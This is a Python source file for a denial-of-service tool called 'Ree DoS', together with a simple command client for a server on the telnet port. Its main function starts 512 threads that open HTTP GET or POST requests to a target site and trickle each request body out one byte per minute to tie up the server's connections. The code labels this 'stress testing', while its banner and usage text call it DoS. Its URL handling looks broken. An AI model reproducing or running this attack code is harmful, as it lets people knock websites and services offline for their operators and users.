import socket
import sys
import threading
import readline  # For command history and auto-completion
import getopt
import re
import time
from colored import fg, attr  # For colored output (install colored package with pip)
from threading import Thread

SERVER_HOST = '127.0.0.1'  # Change this to the IP address of your server
SERVER_PORT = 23  # Change this to the port your server is listening on

# Header
HEADER = """
*/
|---------------------------------------------------|
          ____  ____________   ____  ____  _____
         / __ \/ ____/ ____/  / __ \/ __ \/ ___/
        / /_/ / __/ / __/    / / / / / / /\__ \ 
       / _, _/ /___/ /___   / /_/ / /_/ /___/ / 
      /_/ |_/_____/_____/  /_____/\____//____/  
                                              
|---------------------------------------------------|
         _________            __       
        / ____/ (_)__  ____  / /_ _____
       / /   / / / _ \/ __ \/ __// ___/
      / /___/ / /  __/ / / / /__/ /__  
      \____/_/_/\___/_/ /_/\__(_)___/  
                                 
                                   
|---------------------------------------------------|
       _       __     __                        
      | |     / /__  / /________  ____ ___  ___ 
      | | /| / / _ \/ / ___/ __ \/ __ `__ \/ _ \
      | |/ |/ /  __/ / /__/ /_/ / / / / / /  __/
      |__/|__/\___/_/\___/\____/_/ /_/ /_/\___/ 
                 __      
                / /_____ 
               / __/ __ \
              / /_/ /_/ /
              \__/\____/ 
    ____  ____________   ____  ____  _____
   / __ \/ ____/ ____/  / __ \/ __ \/ ___/
  / /_/ / __/ / __/    / / / / / / /\__ \ 
 / _, _/ /___/ /___   / /_/ / /_/ /___/ / 
/_/ |_/_____/_____/  /_____/\____//____/  
|---------------------------------------------------|

               CODED BY SLEEPTHEGOD
                                                                                               
|---------------------------------------------------|
*/
"""

# Function to receive messages from the server
def receive_messages(sock):
    while True:
        try:
            data = sock.recv(4096).decode()
            if not data:
                print("Disconnected from server")
                break
            print(data)
        except ConnectionResetError:
            print("Connection to server reset by peer")
            break
        except OSError as e:
            print("Error:", e)
            break

# Class for handling stress testing threads
class MyThread(Thread):
    def __init__(self, SITE, DOS_TYPE):
        Thread.__init__(self)
        self.method = DOS_TYPE
        self.site = SITE
        self.kill_received = False

    def run(self):
        while not self.kill_received:
            server = socket.gethostbyname(self.site)
            post = 'x' * 9999
            file = '/'

            request = '%s /%s HTTP/1.1\r\n' % (self.method.upper(), file)
            request += 'Host: %s\r\n' % self.site
            request += 'User-Agent: Mozilla/5.0 (Windows; U;Windows NT 6.1; en-US; rv:1.9.2.12) Gecko/20101026Firefox/3.6.12\r\n'
            request += 'Accept:text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n'
            request += 'Accept-Language: en-us,en;q=0.5\r\n'
            request += 'Accept-Encoding: gzip,deflate\r\n'
            request += 'Accept-Charset: ISO-8859-1,utf-8;q=0.7,*;q=0.7\r\n'
            request += 'Keep-Alive: 9000\r\n'
            request += 'Connection: close\r\n'
            request += 'Content-Type: application/x-www-form-urlencoded\r\n'
            request += 'Content-length: %s\r\n\r\n' % len(post)

            newrequest = '%s\r\n' % post
            newrequest += '\r\n'

            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

            try:
                s.connect((server, 80))
                s.send(request.encode())

                for c in newrequest:
                    s.send(c.encode())
                    time.sleep(60)
                s.close()
            except Exception as e:
                print(f"Target Down? {e}")

# Function for launching stress testing
def launch_stress_test(SITE, DOS_TYPE):
    thread_count = 512
    print('=' * 60)
    print('Layer7-DoS by SleepTheGod | Ree Dos 1.0'.center(60, '-'))
    print('=' * 60)
    threads = []
    for _ in range(thread_count):
        thr = MyThread(SITE, DOS_TYPE)
        print(f'Start - {thr}')
        thr.start()
        threads.append(thr)

    while any(thr.is_alive() for thr in threads):
        try:
            time.sleep(1)
        except KeyboardInterrupt:
            print("\nCtrl-C received! Sending kill signal to threads...")
            for thr in threads:
                thr.kill_received = True
            break

# Function to handle user input and chat functionality
def chat_client():
    try:
        client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        client_socket.connect((SERVER_HOST, SERVER_PORT))
        print("Connected to server")

        # Start a thread to receive messages from the server
        receive_thread = threading.Thread(target=receive_messages, args=(client_socket,))
        receive_thread.start()

        # Main loop to send messages to the server
        while True:
            try:
                message = input("Command: ")
                if message.lower() == 'exit':
                    break
                client_socket.sendall(message.encode() + b'\n')
            except KeyboardInterrupt:
                print("\nKeyboard interrupt detected, exiting chat...")
                break

    except KeyboardInterrupt:
        print("\nKeyboard interrupt detected, exiting chat...")
    except ConnectionRefusedError:
        print("Connection refused. Make sure the server is running.")
    except Exception as e:
        print("Error:", e)
    finally:
        client_socket.close()

# Main function to parse command line arguments and decide between chat or stress test
def main(argv):
    print(HEADER)
    if not argv:
        print("Usage:")
        print("  For chat client mode: python script.py")
        print("  For stress testing mode:")
        print("    GET DOS - python Ree.py -t get http://example.com")
        print("    POST DOS - python Ree.py -t post http://example.com")
        sys.exit(2)

    try:
        opts, args = getopt.getopt(argv, "ht:", ["help", "type="])
    except getopt.GetoptError as err:
        print(str(err))
        sys.exit(2)

    SITE = None
    DOS_TYPE = None

    for opt, arg in opts:
        if opt in ("-h", "--help"):
            print("Usage:")
            print("  For chat client mode: python script.py")
            print("  For stress testing mode:")
            print("    GET DOS - python Ree.py -t get http://example.com")
            print("    POST DOS - python Ree.py -t post http://example.com")
            sys.exit()
        elif opt in ("-t", "--type"):
            if arg.lower() == 'get' or arg.lower() == 'post':
                DOS_TYPE = arg.lower()
                SITE = args[0] if args else None
                if not SITE or not re.match(r'^https?://', SITE):
                    print("Invalid URL. Please provide a valid URL starting with http:// or https://")
                    sys.exit(2)
            else:
                print("Invalid argument. Please specify 'get' or 'post' for stress testing.")
                sys.exit(2)

    if SITE and DOS_TYPE:
        launch_stress_test(SITE, DOS_TYPE)
    else:
        chat_client()

if __name__ == "__main__":
    main(sys.argv[1:])
